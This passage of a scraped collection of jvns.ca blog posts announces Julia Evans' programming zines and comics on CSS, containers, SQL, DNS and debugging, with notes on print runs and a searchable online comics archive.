\n\n North America: \n\n \n No Starch Press’s website  (you can use code WIZARD for 25% off) \n Amazon:  USA ,  Canada ,  Mexico \n Powell’s \n Barnes & Noble \n Chapters  (Canada) \n Alibris \n \n\n Europe: \n\n \n Amazon:  UK ,  Germany ,  Spain ,  Italy ,  France , etc \n Waterstones \n \n\n Asia/Pacific: \n\n \n Fishpond  (Australia) \n Angus & Robertson  (Australia) \n Amazon:  India \n \n\n More: \n\n \n Wordery  (free worldwide shipping) \n Book Depository  (free worldwide shipping) \n \n\n why I’m doing this: to learn about print! \n\n I don’t necessarily expect to make a lot of money from this box set\n(I get 10% or less of each sale, vs 97% for sales of my  other zines  online) but that’s not my\npriority with this project – I did it because I love the free zines I\nwrote, I wanted to make a really nice print version of them, and I wanted to\nlearn about how print works and how traditional publishing works! I’ve already\nlearned a lot about how publishing works and it’s been super interesting. \n\n People have been very excited about this print project so far which has been\nreally nice to see! Next I want to make it possible for people to order print\ncopies of my newer zines, and I’m trying to figure out how to do that now. (if\nyou have a print company that you’ve really loved using, let me know!) \n\n I’m super happy about the print quality and if you get the box set I really\nhope you like it! \n\n"},
{"url": "https://jvns.ca/blog/2020/07/25/some-comics-about-css/", "title": "Some CSS comics", "content": "\n     \n\n Hello! I’ve been writing some comics about CSS this past week, and I thought as\nan experiment I’d post them to my blog instead of only putting them on Twitter. \n\n I’m going to ramble about CSS at the beginning a bit but you can skip to the\nend if you just want to read the comics :) \n\n why write about CSS? \n\n I’ve been writing a tiny bit more CSS recently, and I’ve decided to  actually\ntake some time to learn CSS \ninstead of just flailing around and deciding “oh no, this is impossible”. \n\n CSS feels a little like systems programming / Linux to me – there are a lot of\ncounterintuitive facts that you need to learn to be effective with it, but I\nthink once you learn those facts it gets a lot easier. \n\n So I’m writing down some facts that I found counterintuitive when learning CSS,\nlike the fact that  position: absolute  isn’t absolute! \n\n why try to read the specs? \n\n I’ve been having a lot of fun reading\nthrough the  CSS2 spec  and finding out\nthat some things about CSS that I was intimidated by (like selector specificity) aren’t as complicated as I thought. \n\n I think reading (parts of) the CSS specs is fun because I’m so used to\nlearning CSS by reading a lot of websites which sometimes have conflicting\ninformation. ( MDN  is an incredible resource\nbut I don’t think it’s 100% always correct either.) \n\n So it’s fun to read a more authoritative source! Of course, it’s not always\ntrue that the CSS specs correspond to reality – browser implementations of the\nspecs are inconsistent. \n\n But expecially for parts of CSS that are older & better-established (like the\nbasics of how  position: absolute  works) I like reading the specs. \n\n how are the CSS specs organized? \n\n CSS used to be defined by a single specification (CSS2), but as of CSS 3 each\npart of CSS has its own specification. For example, there’s a CSS 3 specification\n for colours . \n\n Here are the links I’ve been using: \n\n \n there’s a PDF of the  CSS2 spec here \n CSS Snapshot 2018  lists all the CSS specifications as of 2018, which is where I’ve been looking for links to the CSS 3 specifications \n Understanding the CSS Specifications  is an explanation of how to approach reading the CSS specs. For example, it recommends reading  CSS sizing  which I haven’t tried reading yet. \n \n\n I’ve been kind of alternating between the CSS 2 spec and the CSS 3 specs –\nbecause the CSS 2 spec is smaller, I find it easier to digest and understand\nthe big picture of how things are supposed to work without getting lost in a\nlot of details. \n\n a few comics \n\n Okay, here are the comics! As always when I start working on a set of comics /\na potential zine, there’s no specific order or organization. \n\n the box model \n\n \n Permalink:  https://wizardzines.com/comics/box-model \n\n CSS units \n\n \n Permalink:  https://wizardzines.com/comics/units \n\n Reference material: I found  this section on lengths  from “CSS Values and Units Module Level 3” pretty straightforward. \n\n selectors \n\n \n Permalink:  https://wizardzines.com/comics/selectors \n\n Reference material: section  6.4.1 to 6.4.3  from the CSS 2 spec. \n\n position: absolute \n\n \n Permalink:  https://wizardzines.com/comics/position-absolute \n\n inline vs block \n\n \n Permalink:  https://wizardzines.com/comics/inline-vs-block \n\n One piece of errata for this one: you actually can set the width on an inline\nelement if it’s a “replaced” element \n\n"},
{"url": "https://jvns.ca/blog/2020/08/10/some-more-css-comics/", "title": "Some more CSS comics", "content": "\n     \n\n I’ve been continuing to write pages about CSS! Here are 6 more. \n\n Two of them are about how to think about CSS in general (“CSS isn’t easy” and\n“backwards compatibility”), which is something I’m still trying to wrap my head\naround. \n\n handling browser bugs is normal? \n\n The fact that finding workarounds for browser bugs is kind of a normal part of\nwriting CSS really surprised me – there’s this great repo called\n flexbugs  which catalogs bugs in\nbrowser implementations of flexbox. A lot of the bugs are in IE which means\n(depending on your goals) that you can just ignore them, but not all! A bunch\nof the flexbugs are in Chrome or Safari or Firefox. \n\n For example, I ran into  flexbug #9  a few days ago, which is\nthat in Safari a  <summary>  element can’t be a flexbox, so instead you need to\nput an extra div inside the  <summary>  to be the flex element. \n\n In the past I would have reacted to this in a more grumpy way (WHY?\nNOOOOO? WHAT IS HAPPENING?!?! CSS?!?!?!). But this time I noticed that my site\nlooked weird in Safari on my iPad, figured out after 30 minutes or so that it\nwas a Safari bug, implemented a workaround, and it actually wasn’t that big of\na deal! \n\n I think this mindset of “oh, there’s a browser bug, oh well, I guess that\nhappens sometimes!” is a lot healthier and more likely to result in success\nthan getting mad about it. \n\n there are a lot of ways CSS can go wrong \n\n I think there are at least 3 different ways your CSS can be buggy: \n\n \n that element doesn’t have the styles applied that it should (for example\nit’s supposed to be  background; blue  but it’s  background: red  instead) \n the element has the “right” styles applied, but those styles do something\nconfusing / unexpected to me because of something I misunderstood about the\nCSS spec \n the element has the “right” styles applied and those styles do the right\nthing according to the spec, but the browser has a bug and isn’t\nimplementing the spec correctly \n \n\n Anyway, enough CSS musings, here are the comics :) \n\n css isn’t easy \n\n \n Permalink:  https://wizardzines.com/comics/css-isnt-easy \n\n backwards compatibility \n\n \n Permalink:  https://wizardzines.com/comics/backwards-compatibility \n\n CSS specificity \n\n \n Permalink:  https://wizardzines.com/comics/css-specificity \n\n centering in CSS \n\n \n Permalink:  https://wizardzines.com/comics/css-centering \n\n padding syntax \n\n \n Permalink:  https://wizardzines.com/comics/padding-margin \n\n flexbox basics \n\n \n Permalink:  https://wizardzines.com/comics/flexbox-basics \n\n"},
{"url": "https://jvns.ca/blog/2020/04/27/new-zine-how-containers-work/", "title": "New zine: How Containers Work!", "content": "\n     \n\n On Friday I published a new zine: “How Containers Work!”. I also launched a\nfun redesign of  wizardzines.com . \n\n You can get it for $12 at  https://wizardzines.com/zines/containers . If you buy it, you’ll get a PDF that you can\neither print out or read on your computer. Or you can get a pack of  all 8 zines  so far. \n\n Here’s the cover and table of contents: \n\n \n \n \n \n\n why containers? \n\n I’ve spent a lot of time\n figuring \n out \n how to \n run \n things \n in \n containers \nover the last 3-4 years. And at the beginning I was really confused! I knew a\nbunch of things about Linux, and containers didn’t seem to fit in with anything\nI thought I knew (“is it a process? what’s a network namespace? what’s\nhappening?“). The whole thing seemed really weird. \n\n It turns out that containers ARE actually pretty weird. They’re not just\none thing, they’re what you get when you glue together 6 different features\nthat were mostly designed to work together but have a bunch of confusing edge\ncases. \n\n As usual, the thing that helped me the most in my container adventures is a\ngood understanding of the  fundamentals  – what exactly is actually\nhappening on my server when I run a container? \n\n So that’s what this zine is about – cgroups, namespaces, pivot_root,\nseccomp-bpf, and all the other Linux kernel features that make containers work. \n\n Once I understood those ideas, it got a  lot  easier to debug when my\ncontainers were doing surprising things in production. I learned a couple of\ninteresting and strange things about containers while writing this zine too –\nI’ll probably write a blog post about one of them later this week. \n\n containers aren’t magic \n\n This picture (page 6 of the zine) shows you how to run a fish container image\nwith only 15 lines of bash. This is heavily inspired by\n bocker , which “implements” Docker in about\n100 lines of bash. \n\n \n \n \n\n The main things I see missing from that script compared to what Docker actually does when running a container (other than using an actual container image and not just a tarball) are: \n\n \n it doesn’t drop any capabilities – the container is still running as root and has full root privileges (just in a different mount + PID namespace) \n it doesn’t block any system calls with seccomp-bpf \n \n\n container command line tools \n\n The zine also goes over a bunch of command line tools & files that you can\nuse to inspect running containers or play with Linux container features. Here’s a list: \n\n \n mount -t overlay  (create and view overlay filesystems) \n unshare  (create namespaces) \n nsenter  (use an existing namespace) \n getpcaps  (get a process’s capabilities) \n capsh  (drop or add capabilities, etc) \n cgcreate  (create a cgroup) \n cgexec  (run a command in an existing cgroup) \n chroot  (change root directory. not actually what containers use but interesting to play with anyway) \n /sys/fs/cgroups  (for information about cgroups, like  memory.usage_in_bytes ) \n /proc/PID/ns  (all a process’s namespaces) \n lsns  (another way to view namespaces) \n \n\n I also made a short youtube video a while back called  ways to spy on a Docker container  that demos some of these command line tools. \n\n container runtime agnostic \n\n I tried to keep this zine pretty container-runtime-agnostic – I mention Docker\na couple of times because it’s so widely used, but it’s about the Linux kernel\nfeatures that make containers work in general, not Docker or LXC or\nsystemd-nspawn or Kubernetes or whatever. If you understand the fundamentals\nyou can figure all those things out! \n\n we redesigned wizardzines.com! \n\n On Friday I also launched a redesign of\n wizardzines.com !  Melody Starling  (who is amazing) did the design. I think now it’s\nbetter organized but the tiny touch that I’m most delighted by is that now the zines jump with joy when\nyou hover over them. \n\n One cool thing about working with a designer is – they don’t just\nmake things  look  better, they help  organize  the information better so the\nwebsite makes more sense and it’s easier to find things! This is probably obvious to anyone who knows anything about design\nbut I haven’t worked with designers very much (or maybe ever?) so it was really cool to see. \n\n One tiny example of this: Melody had the idea of adding a tiny FAQ on the\nlanding page for each zine, where I can put the answers to all the questions\npeople always ask! Here’s what the little FAQ box looks like: \n\n \n \n \n\n I probably want to edit those questions & answers over time but it’s SO NICE to have\nsomewhere to put them. \n\n what’s next: maybe debugging! or working more on flashcards! \n\n The two projects I’m thinking about the most right now are \n\n \n a zine about debugging, which I started last summer and haven’t gotten around to finishing yet \n a  flashcards project  that I’ve been adding to slowly over the last couple of months. I think could become a nice way to explain basic ideas. \n \n\n \nHere’s a link to where to  get the zine  again :) \n\n"},
{"url": "https://jvns.ca/blog/2020/02/03/new-zine--become-a-select-star/", "title": "New zine: Become a SELECT Star!", "content": "\n     \n\n On Friday I published a zine about SQL called “Become a SELECT Star!” \n\n You can get it for $12 at  https://wizardzines.com/zines/sql . If you buy it, you’ll get a PDF that you can\neither read on your computer or print out. You can also get a pack of  all 7 zines  so far. \n\n Here’s the cover and table of contents: \n\n \n \n \n \n\n why SQL? \n\n I got excited about writing a zine about SQL because at my old job I\nwrote a ton of SQL queries (mostly related to machine learning) and by doing that I learned there are a lot of weird\nthings about SQL! For example –  SQL queries don’t actually start with\nSELECT .\nAnd the way  NULL behaves isn’t really intuitive at\nfirst . \n\n It’s been really fun to go back and try to explain the basics of SQL from the\nbeginning. (what’s the difference between WHERE and HAVING? what’s the basic\nidea with indexes actually? how do you write a join?) \n\n I think SQL is a really nice thing to know because there are SO MANY SQL\ndatabases out there, and some of them are super powerful! (like BigQuery and\nRedshift). So if you know SQL and have access to one of these big data\nwarehouses you can write queries that crunch like 10 billion rows of data\nreally quickly. \n\n lots of examples \n\n I ended up spending a lot of time on the examples in this zine, more than in\nany previous zine. My friend  Anton  helped me come up with a fun way to\nillustrate them, where you can clearly see the query, the table it’s running\non, and what the query outputs. Like this: \n\n \n\n experiment: include a SQL playground \n\n All the examples in the zine are real queries that you can run. So I thought:\nwhy not provide a simple environment where people can actually run those\nqueries (and variations on those queries) to try things out? \n\n So I built a small  playground where you can run queries on the example\ntables in the zine . It uses SQLite\ncompiled to web assembly, so all the queries run in your browser. It wasn’t too\ncomplicated to build – I just used my minimal Javascript/CSS skills and vue.js. \n\n I’d love to hear any feedback about whether this is helpful or not – the\nexample tables in the zine are really small (you can only print out small SQL\ntables!), so the biggest table in the example set has 9 rows or something. \n\n what’s next: probably containers \n\n I think that next up is going to be a zine on containers, which is more of a\nnormal systems-y topic for me. (for example:  namespaces ,  cgroups ,  why containers? ) \n\n \nHere’s a link to where to  get the zine  again :) \n\n"},
{"url": "https://jvns.ca/blog/2022/04/26/new-zine--how-dns-works-/", "title": "New zine: How DNS Works!", "content": "\n     \n\n Hello! On Thursday we released a new zine about one of my favourite computer systems: DNS! \n\n You can get it for $12 here:\n https://wizardzines.com/zines/dns , or get\nan  11-pack of all my zines here . \n\n Here’s the cover and table of contents: \n\n \n \n \n \n\n why DNS? \n\n I wanted to write about DNS for three reasons: \n\n \n DNS is everywhere!  You basically can’t use the internet without using\nDNS — nobody is going to memorize all the IP addresses for every domain they\nuse. You need to look them up with DNS! \n DNS has a really cool decentralized design!  I love that it gives you\ncontrol of your own little corner of the internet (it just costs ~$12/year to\nown a domain!), I love that the basic design is relatively straightforward,\nand I love that it’s worked basically the same way for 40 years and scaled\nrelatively well over time \n DNS is very frustrating!  I’ve run into some VERY weird DNS problems over\nthe years, and it can feel magical and incomprehensible if you don’t know\nhow it works. But once you learn how DNS works, these problems all become\ntotally possible to understand. \n \n\n And I’ve never seen a clear explanation of DNS that included all of the\ntechnical details I wanted to know, so I decided to write one. \n\n a DNS playground! \n\n I find the most fun way to learn is by experimenting and breaking things! So back in December,\n Marie  and I built a playground where you can do\nweird DNS experiments with no consequences if you mess something up. \n\n It’s called  Mess With DNS . It has examples of\nexperiments you can try, and you’ve very encouraged to come up with your own\nexperiments. \n\n There’s also  a blog post  from when we released it in December. \n\n a simple DNS lookup tool \n\n I also built a little DNS lookup tool at  https://dns-lookup.jvns.ca  to provide\nan easy way to do DNS queries without using the command line. Even though I\nlove the command line I actually find myself using it all the time. \n\n what we left out: DNS security \n\n The main thing that  isn’t  in the zine is DNS security (DNS over HTTPS, DNS\nover TLS, DNSSEC).  This is because the DNS security landscape still seems to\nbe evolving, and I didn’t feel confident that we could write something that\nwould still be true in 5-10 years. \n\n I think I’ll try to write a blog post about DNS security at some point though. \n\n identifying common points of confusion is amazing \n\n I mentioned earlier that my friend  Marie Claire LeBlanc Flanagan  and I built\nMess With DNS together in December. That was really fun, so Marie and I decided\nto work together on this zine too – we paired on it for about an hour every\nweekday for almost 4 months. I’m pretty sure I wouldn’t have finished the zine\nwithout her. \n\n She was incredibly helpful with everything to do with the zine (editing!\ncharacter design! marketing! rewriting the NS records page 5 times!), but one\nof the biggest things she improved for this zine was  feedback . \n\n Usually I only get feedback from maybe 10 beta readers, but this time we wanted\nto hear from more people and get better at identifying common points of confusion. \n\n We did this by building a small custom feedback website where people could\nclick on a page and leave feedback (“I have a question! This is confusing! I\nlearned something! I have a suggestion! I love this!“). \n\n Building a custom website let us organize the feedback way more easily and hear\nfrom more people – in the end we got ~1200 feedback items from ~60 people and\nall of the feedback made the zine a LOT better. \n\n I might write a longer meta post about all of this later. \n\n some blog posts leading up to this zine \n\n I wrote a bunch of blog posts about DNS over the last year or so while thinking\nabout this zine. Here they all are: \n\n \n What happens when you update your DNS? \n A little tool to make DNS queries \n A tool to spy on your DNS queries: dnspeep \n How do you tell if a problem is caused by DNS? \n DNS “propagation” is actually caches expiring \n Why might you run your own DNS server? \n Some ways DNS can break \n A toy DNS resolver \n The multiple meanings of “nameserver” and “DNS resolver” \n \n\n you can get a print copy shipped to you! \n\n There’s always been the option to print the zines yourself on your home printer. \n\n But this time there’s a new option too: you can get a print copy shipped to\nyou! (just click on the “print version” link on  this\npage ) \n\n The only caveat is that the international shipping costs are unreasonably high,\nso if you’re outside the US it probably doesn’t make sense to get just 1 zine\nshipped to you. I’m still trying to find a workaround for that. Orders of $60+\ndo include free international shipping though. \n\n Here’s the link to get the zine again:\n https://wizardzines.com/zines/dns/ \n\n thank you \n\n If you’ve bought zines in the past, thanks so much for all your support over\nthe years. None of this would be possible without you. \n\n"},
{"url": "https://jvns.ca/blog/2020/08/22/print-run-manager-zine/", "title": "Wizard Zines' first print run: Help! I have a Manager!", "content": "\n     \n\n Hello! For the first time, Wizard Zines is doing a ★★print shipment★★! \n\n I printed out 400 copies of  Help! I have a manager!  at the\nbest print shop I could find in Montreal and they’re ready to ship to you. Free\nshipping to anywhere in the world (as long as Canada Post will let me ship\nthere) is included. The deadline to order a zine is  September 6 . \n\n I’ve wanted to get into printing and shipping my zines for a long time, so I’m\nvery excited to try this out. So far the only option has been for people to\nprint them on their home printers or at their local print shop. \n\n I’m doing all the packaging and shipping myself from my house, so I’m going to\nship them all out in a big batch around September 7. \n\n \nEdit from the future: this is over but you can now buy print version of all my zines at  https://wizardzines.com \n \n\n the zines! \n\n Here’s a picture of one of the boxes of zines! So many zines!\n \n\n I experimented with a few different print shops in Montreal, and I found out\nthat using a print shop that cost more got me way better quality zines! So\nthat’s what I did. (I went with  Photosynthèse ). \n\n why I’m shipping them myself \n\n I spent a bunch of time looking into fulfillment companies to try to ~scale~\nprinting & shipping zines. That research might still come in handy if\nthis first batch goes well (I probably won’t keep doing it myself forever!),\nbut in the spirit of\n flintstoning , I\ndecided it would be a lot simpler to start out by not overengineering the\nprocess. Shipping a zine to the US from Canada using letter mail only costs\nabout $3, so I can even include free shipping. \n\n I’ve actually shipped 100 zines once before in an  indiegogo campaign I ran in\n2016 ,\nand it wasn’t too bad, so I’m confident that I can ship 400 zines manually as\nlong as I can do it all in one giant batch. That time I even wrote all the\naddresses by hand, which I definitely won’t do this time. \n\n And doing it myself means I can do some fun things with the envelopes & my\nlaser printer that would be hard to convince a fulfillment company to do. \n\n FAQ \n\n Here’s a FAQ which will hopefully answer all your questions! Email me\nat print@wizardzines.com if you have other questions. \n\n What’s included? \n\n You’ll get: \n\n \n A print copy of Help! I have a manager!, printed in full colour on high quality paper. \n A PDF copy of Help! I have a manager! (which usually costs $10 on its own). \n \n\n What’s the order deadline? \n\n The deadline to order a zine is  September 6 . \n\n When will I get it? \n\n I’ll mail all the zines around September 7-8, 2020 (right after orders close). \n\n You should get your zine about a week later, assuming the mail system behaves. \n\n Will I get a tracking number? \n\n No. All the zines will be shipped by first class letter mail from Canada, without any tracking. This keeps shipping costs down so that I can do free shipping :). If anything at all goes wrong with your shipment, just let me know ( print@wizardzines.com ) and I’ll mail you another one. (it’s like UDP!) \n\n The zines should reach the US in about a week, longer if you’re overseas. \n\n Can I order more than one copy at a time? \n\n No, to keep things simple, I’m only shipping one zine at a time. I’m hoping to do batches in the future though! \n\n Can I order these for my team? \n\n Yes! You’ll just need to make one order per person, so that I get everyone’s shipping address. This is extremely compatible with remote work :) \n\n also, if you want to order 50 or more print copies mailed to a single address, email me and we’ll work something out \n\n What happens if I don’t order by September 6? \n\n If this print run sells out, we’ll print more in the future! \n\n What if I already bought the digital copy? \n\n If you already bought the digital copy – thank you!! You can email me at  print@wizardzines.com  and I’ll send you a discount code to get the print version for less. \n\n What are your future print plans? \n\n If this print run goes well, I’ll figure out how to scale the process up beyond “let’s ship 400 zines from my house”. I’m not sure how that will work yet, but we’ll figure it out! \n\n \n.button {\nposition: relative;\ndisplay: inline-block;\npadding: .5rem .75rem;\nmargin-bottom: 1rem;\nborder: 1px solid black;\nborder-radius: .5rem;\ncolor: black;\nbackground: #fcd947;\ntext-shadow: 0px 1px 1px rgba(255, 255, 255, .75);\nbox-shadow: 2px 2px #e8ab72, 6px 6px black;\ntransition: all 100ms ease;\nline-height: 1.2em;\nfont-size: 0.9em;\nfont-weight: 700;\n}\n.button:active {\n    transform: translateX(4px) translateY(4px);\n    box-shadow: 0px 0px #e8ab72, 0px 0px black;\n}\n \n\n here’s the link again! \n\n Here’s the link to order a print copy, again! If you just want the PDF, you can get it here:  Help! I have a Manager! PDF . \n\n                                                                                                                        \n   Get it for $16 \n\n \n\n"},
{"url": "https://jvns.ca/blog/2022/12/21/new-zine--the-pocket-guide-to-debugging/", "title": "New zine: The Pocket Guide to Debugging", "content": "\n     \n\n Hello! On Monday, we released a new zine:  The Pocket Guide to Debugging ! It has 47 of my favourite strategies for solving your sneakiest bugs. \n\n You can get it for $12 here:\n https://wizardzines.com/zines/debugging-guide , or get\nan  12-pack of all my zines here . \n\n Here’s the cover: \n\n \n \n \n\n the table of contents \n\n Here’s the table of contents! \n\n \n\n A few people mentioned that they were printing it out, so I made a PDF\nposter version if you want to print it: \n\n \n Printable table of contents (letter paper) \n Printable table of contents (A4 paper) \n \n\n I love that the table of contents is already kind of useful as a collection of\nstrategies on its own. \n\n why debugging? \n\n I wrote this zine because debugging is a huge part of how we spend our time as\nprogrammers, but nobody teaches us how to do it! If you’re lucky, you get to\npair program with someone who’s good at debugging and explaining their thought\nprocesses, and they can show you. But not all of us have that person, so we end\nup just struggling through it ourselves and learning strategies the hard way. \n\n So I wanted to write a zine where beginners can learn some of these strategies\nthe easy way, and which more experienced programmers can use as a reference to\nget ideas when you’re in the middle of a tricky bug. \n\n it comes with some debugging mysteries! \n\n This zine comes with a few choose-your-own-adventure debugging mysteries (like “The Case of the Connection Timeout”), at  https://mysteries.wizardzines.com . \n\n These mysteries show you how to apply some of the tricks in the zine to a\nspecific kind of bug: computer networking issues! It also demos some of my\nfavourite networking spy tools – it’ll show you some tips for interpreting\ntheir output. \n\n You can read some notes on designing those puzzles here:  Notes on building debugging puzzles .\n(You might notice that post is from a year and half – that’s because I’ve been\ntrying to write this zine on and off for 3 and a half years and a lot of things\nhappened along the way :)) \n\n it’s actually been helping me debug! \n\n I’ve actually been shocked by how useful this zine has been for helping  me \ndebug – after all, I know all these strategies! I like to think I’m pretty\ngood at debugging! \n\n But when I’m in the middle of a tricky bug and I’m frustrated, I’ve actually\nbeen finding it incredibly helpful to reach for the table of contents and get\nan idea for something to try. \n\n It’s also been fun to reflect on what strategies I’m using when debugging. For\nexample, yesterday I had a CSS bug, and I was super frustrated. But it turned\nthat I just needed to: \n\n \n come up with  one small question \n write a  tiny program \n start  writing a message asking for help \n quickly  read the docs \n delete the message I started writing without sending it, since I’d figured it out :) \n \n\n some blog posts I wrote along the way \n\n Here are a few blog posts I wrote while thinking about how to write this zine: \n\n \n a debugging manifesto \n some ways to get better at debugging \n reasons why bugs might feel “impossible” \n when debugging, your attitude matters \n what does debugging a program look like? \n \n\n you can get a print copy shipped to you! \n\n There’s always been the option to print the zines yourself on your home\nprinter. \n\n But this time there’s a new option too: you can get a print copy shipped to\nyou! (just click on the “print version” link on  this\npage ) \n\n The only caveat is print orders will ship around  the end of January  – I\nneed to wait for orders to come in to get an idea of how many I should print\nbefore sending it to the printer. \n\n the home printing directions are a little bit different! \n\n This zine is twice the length of other zines, but half the height! This makes\nit extremely pocket sized, and it means you have to cut the print version in\nhalf. But don’t worry – there’s a dotted line and a video :) \n\n The video with the print directions is at  https://wizardzines.com/print/ \n\n the hardest part of writing this zine: making it specific \n\n It’s relatively easy to give high-level debugging advice. Reproduce the bug! Be\nrigorous! Try to divide the problem space in half! Print stuff out! And this\nzine started out as pretty general high-level advice. (you can read a  old table of contents here from an earlier draft ) \n\n Turning those high-level guidelines into  specific things that you can\nactually do  was a lot harder. I sat down with my amazing friend\n Marie Claire LeBlanc Flanagan  every weekday at 10am for 6 months, and\nevery day we made the zine a little more specific and concrete and useful. \n\n I’m really proud of how it turned out. \n\n beta readers are amazing \n\n Also, I want to thank the beta readers – 40 of you read the zine and left\ncomments about what was confusing, what was working, and ideas for how to make\nit better. It made the end product so much better. \n\n thank you \n\n As always: if you’ve bought zines in the past, thank you for all your support\nover the years. I couldn’t do this without you. Happy holidays. \n\n"},
{"url": "https://jvns.ca/blog/2020/11/22/new-zine--hell-yes--css-/", "title": "New zine: Hell Yes! CSS!", "content": "\n     \n\n Hello! Last Friday I released a new zine called Hell Yes! CSS! \n\n You can get it for $12 here:\n https://wizardzines.com/zines/css , or get\na  9-pack of all my zines here \nfor $88. \n\n Here’s the cover and table of contents: \n\n \n \n \n \n\n why CSS? \n\n I’ve been writing CSS on and off (mostly off) for about 15 years. For almost all of that time, CSS\nreally felt impossible to me – every time I did a seemingly simple task (like\nthe classic “center a div”), I had to Google how to do it, then it wouldn’t\nwork the way I expected, than I’d change random things, and eventually the\nthing would kind of sort of work. Then I’d never really internalize what I’d\nlearned and I’d start again from scratch the next time. I didn’t write CSS very\noften, and because it seemed “impossible”, I never put the effort in to get\nbetter. \n\n there’s a better way \n\n But this year, I learned a different way to approach CSS. I’d hired\n Melody Starling  to design & implement  https://wizardzines.com  for me.\nIn addition to being a great designer, I saw that their approach to writing CSS\nwas COMPLETELY DIFFERENT from mine. \n\n They: \n\n \n didn’t Google basic CSS facts, if they needed to center something they would\njust center it \n could do things that I thought were “impossible” (like using position:\nabsolute) quickly and have them work the first thing \n debugged CSS issues quickly & seemed to clearly understand why the changes\nthey made fixed the problem. They never made random changes. \n \n\n Of course, a lot of this comes from their extensive experience writing CSS and\nI couldn’t just magically import their experience into my brain. But I realized\nsomething important. \n\n CSS isn’t arbitrary, it’s just counterintuitive sometimes \n\n Here’s one example. For my first 13 years of occasionally writing CSS poorly, I\ndidn’t understand how  position: absolute  worked. I thought it positioned things\nabsolutely on the page (isn’t that what the absolute means??), but sometimes\nI’d see things that made that seem wrong, so I was just confused and sad about\nit. \n\n But then I learned something that changed everything for me:  position: absolute \nactually positions elements relatively to the closest positioned parent. \n\n Here’s a codepen that shows an example of what I mean. It shows how to position\n4 stars at the 4 corners of a box (it’s actually very easy!!)\n https://codepen.io/wizardzines/pen/ZEOzqaN \n\n Actually taking the time to understand how  position: absolute  worked didn’t\ntake that long (I just needed to learn 1 fact!!) and it meant that now I no\nlonger have to blindly copy paste CSS to absolutely position things. I can\nfigure them out myself, and I’m a lot more faster and confident. \n\n learning some CSS fundamentals can help a lot \n\n Hell yes! CSS! explains some of the CSS fundamentals that have helped me get more\nWAY more confident with CSS this year. Since I learned them, I’ve been able to\nquickly make a lot of fun small websites with confidence, and CSS bugs have\nbeen a lot more tractable. I’ve been able to actually reason through a lot of\nmy CSS problems – no more throwing spaghetti at the wall and hoping my website\neventually looks the way I want! (ok, let’s be honest, there’s still a little\nof that, but it’s been WAY BETTER). \n\n and so does having the right attitude \n\n The other thing Hell Yes! CSS! talks about a little bit is attitude! CSS can absolutely be\ndifficult and frustrating. But did you know that if you write\nstandards-compliant CSS, then browser backwards compatibility will ensure that\nyour website keeps working FOREVER?! \n\n So if you spend the effort to get your CSS right once, it’ll keep looking great\nfor the next 10 years. I’ve changed my attitude towards CSS from “UGH WHY! CSS\nBAD! I AM SAD!” to “oh, interesting! Why doesn’t this work? I can probably\nfigure it out!” and it’s helped a LOT. \n\n So that’s what this zine is about! \n\n I also put together some CSS examples \n\n The zine has a lot of counterintuitive CSS facts, and I know from experience\nthat it’s very difficult to learn hard things just by reading some text – I\nalways need to play around with some actual real CSS to understand how it\nworks. \n\n So I built  CSS examples  ( https://css-examples.wizardzines.com/ ) to help with\nthis a little bit. It has about 20 examples illustrating various CSS facts.\nSome of them are relatively straightforward (like the one on  border-radius ),\nand some of them are pretty surprising and confusing at first, like this one on\nhow  left: 0; right: 0 is different from width: 100%;  and this super weird thing\nabout how  inline-block elements are aligned differently depending on whether\nthey have text in them . \n\n You can edit them all using the amazing  https://codepen.io/  (click “Edit on\nCodepen”), and a lot of them have specific suggestions for changes to try to\nunderstand how the example works better. \n\n what’s next: a zine on bash scripting! \n\n I have a zine on bash scripting called Bite Size Bash almost finished, and I’m\ngoing to release it pretty soon. \n\n Another idea I have for the future is to put together a bunch of “CSS\n études ” – basically “here’s a\ndesign, implement this in CSS”. If this already exists, I’d love to know about it! \n\n \n \n\n Here’s a link to where to  get Hell Yes!\nCSS!  again :). As usual if you’re in a\ncountry where $12 USD is a lot of money, I have some country-specific discounts\n– if you click the link you should see them. \n\n"},
{"url": "https://jvns.ca/blog/2021/05/02/publishing-comics/", "title": "I put all of my comics online!", "content": "\n     \n\n Hello! As you probably know, I write a lot of comics about programming, and I publish collections of them as zines you can buy at  https://wizardzines.com . \n\n I also usually post the comics on Twitter as I write them. But there are a lot of problems with just posting them to Twitter, like: \n\n \n the pages are hard to find . For example, if you want to find the one on\n socat , you can  search twitter \nand you’ll find it, but then you have to somehow magically guess what words I\nused in the tweet, and also sort through a bunch of other tweets. \n they’re annoying to link to . Twitter isn’t really the best user interface for this sort of thing. \n I can’t make updates . Twitter doesn’t have an edit button! \n work that never made it into a zine is basically impossible to find . For example I\nwrote 12 pages of a sequel to “bite size linux” but never quite finished it,\nand it’s basically impossible for anyone to find those pages. Or I have a\ncouple of  pages  about  Kubernetes  I wrote one time that will probably never\nmake it into a zine either. \n \n\n If someone wants to see the page on socat, I’d really like them to just be able to find it at  https://wizardzines.com/comics/socat \n\n now they’re all online in one place! \n\n the tl;dr is that (almost) all of my comics are now online in one place at  https://wizardzines.com/comics . Hooray! \n\n you can search! \n\n There are 273 comics right now which is a lot, so I’ve added a very simple\nsearch using  list.js . Here’s what it looks like. \n\n \n\n It searches based on the title and also a few keywords I manually added, which\nis why “authoritative nameservers” matches the search “dns”. \n\n I wrote a small custom search function that only matches starting at the\nbeginning of the word, so that the search “tar” doesn’t give you “start”. It\nfeels pretty good to use. \n\n If you want to read the pages from the Bite Size Linux sequel I mentioned that\nI started writing 2 years ago and never finished, you can search for “linux2”. \n\n what’s not there \n\n Some parts of the zines aren’t there just because it wouldn’t make sense – for\nexample most of the zines have an introduction and a conclusion page, and those\npages don’t really work as a standalone comic. \n\n Also a lot of the pages from my free zines aren’t there yet because a lot of\nthem don’t work as well as standalone pages. I might add them in the future\nthough, we’ll see. \n\n Other things that are missing that I think I will add: \n\n \n the comics from  https://drawings.jvns.ca \n any other pages I’ve posted over the years on Twitter that aren’t in a zine,\nassuming that I can find them (for example  scenes from distributed systems ) \n \n\n why I didn’t do this earlier \n\n This isn’t actually that hard of a change to make technically – I just needed\nto write some Python scripts and write a little search function. \n\n But I felt a bit worried about making all the comics more easily available\nonline because – what if I put them online and then nobody wants to buy the\nzines anymore? \n\n I decided this week not to worry about that and just do it because I’m really\nexcited about being able to easily link any comic that I want. \n\n The zine business is going really well in general so I think it’s a lot nicer\nto operate with a spirit of abundance instead of a spirit of scarcity. \n\n"},
